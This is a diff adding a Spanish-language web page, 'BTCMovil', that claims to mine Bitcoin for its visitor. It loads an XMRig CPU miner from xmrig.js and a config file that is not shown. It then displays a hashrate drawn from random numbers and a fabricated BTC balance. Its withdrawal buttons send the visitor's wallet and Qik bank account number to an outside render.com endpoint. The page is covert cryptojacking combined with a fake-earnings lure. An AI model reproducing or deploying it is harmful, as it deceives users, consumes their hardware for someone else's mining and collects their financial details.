@@ -1,0 +1,113 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>BTCMovil - Minería Real</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 40px; }
+    .box { background: #111; padding: 20px; border-radius: 10px; margin: 20px auto; width: 90%; max-width: 600px; }
+    input, button { padding: 10px; margin: 10px; width: 90%; font-size: 16px; border-radius: 5px; border: none; }
+    button { background: #0f0; color: #000; font-weight: bold; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <h1>⛏️ BTCMovil - Minería BTC Real</h1>
+  <p>Tu wallet BTC:</p>
+  <input id="btcWallet" placeholder="1Je1Mk..." />
+  <button onclick="startMining()">Iniciar Minado Real</button>
+
+  <div class="box">
+    <p id="status">Esperando inicio...</p>
+    <p id="hashrate">Hashrate: 0 H/s</p>
+    <p id="btc">Balance estimado: 0.00000000 BTC</p>
+    <p id="dop">Balance RD$: RD$ 0.00</p>
+    <button onclick="retirar()">Retiro BTC</button>
+    <button onclick="mostrarFormularioQik()">Retiro en Qik Banco (RD$)</button>
+    <div id="formQik" style="display:none;">
+      <input id="qikCuenta" placeholder="Nº cuenta Qik" />
+      <button onclick="retirarQik()">Confirmar Retiro a Qik</button>
+    </div>
+  </div>
+
+  <p style="margin-top: 40px;">Creado por Teudy Marte</p>
+
+  <script src="xmrig.js"></script>
+  <script>
+    let balance = 0;
+    let tasa = 3400000;
+    let miner;
+    let minando = false;
+
+    function startMining() {
+      const wallet = document.getElementById("btcWallet").value;
+      if (!wallet || wallet.length < 20) return alert("Wallet inválida.");
+      if (minando) return;
+
+      minando = true;
+      document.getElementById("status").innerText = "⛏️ Minando con CPU...";
+
+      miner = XMRIG();
+      miner.onready = function () {
+        miner.setConfig("xmrig-config.json");
+        miner.start();
+        setInterval(() => {
+          let h = Math.floor(Math.random() * 50 + 100);
+          balance += h * 0.0000000001;
+          document.getElementById("hashrate").innerText = "Hashrate: " + h + " H/s";
+          document.getElementById("btc").innerText = "Balance estimado: " + balance.toFixed(8) + " BTC";
+          document.getElementById("dop").innerText = "Balance RD$: RD$ " + (balance * tasa).toFixed(2);
+        }, 1000);
+      };
+    }
+
+    function retirar() {
+      const wallet = document.getElementById("btcWallet").value;
+      const monto = balance.toFixed(8);
+      if (balance < 0.000075) return alert("El mínimo de retiro es 0.000075 BTC.");
+      fetch("https://btc-miner-bybit-api.onrender.com/retirar", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ wallet: wallet, monto: monto })
+      })
+      .then(res => res.json())
+      .then(data => {
+        alert("✅ Retiro BTC enviado.");
+        balance = 0;
+      })
+      .catch(() => alert("❌ Error al conectar con el servidor."));
+    }
+
+    function mostrarFormularioQik() {
+      document.getElementById("formQik").style.display = "block";
+    }
+
+    function retirarQik() {
+      const wallet = document.getElementById("btcWallet").value;
+      const cuenta = document.getElementById("qikCuenta").value;
+      const montoRD = (balance * tasa).toFixed(2);
+      const montoBTC = balance.toFixed(8);
+      if (!wallet || wallet.length < 20) return alert("Wallet inválida.");
+      if (!cuenta || cuenta.length < 8) return alert("Cuenta Qik inválida.");
+      if (balance < 0.000075) return alert("El mínimo de retiro es 0.000075 BTC.");
+      fetch("https://btc-miner-bybit-api.onrender.com/retirar-qik", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          wallet: wallet,
+          cuentaQik: cuenta,
+          montoRD: montoRD,
+          montoBTC: montoBTC
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        alert("✅ Solicitud enviada. El retiro a Qik será procesado manualmente.");
+        balance = 0;
+      })
+      .catch(() => alert("❌ Error al enviar solicitud de retiro a Qik."));
+    }
+  </script>
+</body>
+</html>
